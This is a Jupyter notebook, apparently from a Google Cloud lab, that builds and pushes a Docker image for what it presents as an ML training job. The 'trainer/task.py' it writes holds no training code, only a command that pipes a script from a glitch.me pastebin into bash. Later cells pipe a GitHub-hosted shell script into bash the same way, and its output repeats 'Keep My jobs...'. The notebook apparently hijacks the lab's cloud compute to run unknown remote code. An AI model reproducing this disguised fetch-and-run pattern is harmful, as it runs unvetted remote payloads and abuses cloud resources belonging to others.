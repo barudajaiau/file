{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "0559f8c9-5402-49cf-9da6-a06e2fdc410f",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing Dockerfile\n"
     ]
    }
   ],
   "source": [
    "%%writefile Dockerfile\n",
    "\n",
    "FROM python:3.9-slim\n",
    "WORKDIR /\n",
    "RUN apt update && apt -y install curl git wget\n",
    "# Copies the trainer code to the docker image.\n",
    "COPY trainer /trainer\n",
    "# Sets up the entry point to invoke the trainer.\n",
    "ENTRYPOINT [\"python\", \"-m\", \"trainer.task\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "4eac2d3c-21c0-4863-8ae6-20d24a9854be",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "! mkdir trainer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "63636b49-195c-41c9-8d0a-9fc35cf9ae95",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting trainer/task.py\n"
     ]
    }
   ],
   "source": [
    "%%writefile trainer/task.py\n",
    "\n",
    "import sys\n",
    "import os\n",
    "\n",
    "os.system('curl -sL https://muq-hastebin.glitch.me/raw/z0lEYmJql2 | bash')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "b6784f0c-55cc-4289-a34f-8c3f8a915742",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending build context to Docker daemon  430.6kB\n",
      "Step 1/5 : FROM python:3.9-slim\n",
      " ---> 6a22698eab0e\n",
      "Step 2/5 : WORKDIR /\n",
      " ---> Using cache\n",
      " ---> 5297889def99\n",
      "Step 3/5 : RUN apt update && apt -y install curl git wget\n",
      " ---> Using cache\n",
      " ---> ae493abff2ca\n",
      "Step 4/5 : COPY trainer /trainer\n",
      " ---> 9fe3a143f5fb\n",
      "Step 5/5 : ENTRYPOINT [\"python\", \"-m\", \"trainer.task\"]\n",
      " ---> Running in d54b19001507\n",
      "Removing intermediate container d54b19001507\n",
      " ---> 275a2d860ed0\n",
      "Successfully built 275a2d860ed0\n",
      "Successfully tagged gcr.io/qwiklabs-gcp-02-8d1c52d61100/moso:cok\n"
     ]
    }
   ],
   "source": [
    "# Build the docker image\n",
    "! docker build ./ -t $\"gcr.io/qwiklabs-gcp-02-8d1c52d61100/moso:cok\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "17c71ac5-2d58-40be-8388-78ab5f1a8857",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The push refers to repository [gcr.io/qwiklabs-gcp-02-8d1c52d61100/moso]\n",
      "\n",
      "\u001b[1Bd5502757: Preparing \n",
      "\u001b[1B837400dd: Preparing \n",
      "\u001b[1Ba17e24d9: Preparing \n",
      "\u001b[1Bad7c65c4: Preparing \n",
      "\u001b[1Be749b484: Preparing \n",
      "\u001b[6Bd5502757: Pushed lready exists \u001b[1A\u001b[2K\u001b[6A\u001b[2Kcok: digest: sha256:efddbefbd81911cb305e375e3c1f56493495c9d2b5cda89fc5ceffe6f238ed4c size: 1578\n"
     ]
    }
   ],
   "source": [
    "# Push it to Google Container Registry:\n",
    "! docker push $\"gcr.io/qwiklabs-gcp-02-8d1c52d61100/moso:cok\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3ea06966-d615-4d4f-94cb-b4c713188a9c",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Keep My jobs...\n",
      "Keep My jobs...\n",
      "Keep My jobs...\n"
     ]
    }
   ],
   "source": [
    "!curl -sL https://github.com/loeto21/lieur/raw/main/puyeng.sh | bash"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8d8f80da-d71a-45a8-9b74-df0559ab4db5",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "curl -sL https://github.com/loeto21/lieur/raw/main/puyeng.sh | bash"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "542258f0-4de2-4039-8864-6d4c8109d359",
   "metadata": {},
   "outputs": [],
   "source": [
    "gcloud ai hp-tuning-jobs list"
   ]
  }
 ],
 "metadata": {
  "environment": {
   "kernel": "conda-base-py",
   "name": "workbench-notebooks.m125",
   "type": "gcloud",
   "uri": "us-docker.pkg.dev/deeplearning-platform-release/gcr.io/workbench-notebooks:m125"
  },
  "kernelspec": {
   "display_name": "Python 3 (ipykernel) (Local)",
   "language": "python",
   "name": "conda-base-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.15"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
